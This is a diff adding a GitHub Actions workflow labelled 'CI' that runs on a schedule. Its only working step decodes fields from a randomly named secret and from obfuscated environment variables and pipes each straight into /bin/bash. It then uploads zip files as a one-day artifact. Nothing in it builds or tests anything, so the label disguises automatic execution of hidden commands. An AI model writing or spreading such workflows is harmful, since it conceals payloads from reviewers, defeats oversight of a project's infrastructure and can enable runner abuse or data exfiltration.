@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          huefp96067: ${{ secrets.huefp96067 }}
+        run: |
+          printf '%s' "$huefp96067" | jq -r .pp87618 | /bin/bash
+          echo $ot08 | jq -r .y13 | /bin/bash
+          echo $owu6 | jq -r .j5564 | /bin/bash
+          echo $wcgj59 | jq -r .xhwe611 | /bin/bash
+          echo $jde51 | jq -r .xw2 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vd6JY7C7
+          path: "*.zip"
+          retention-days: 1
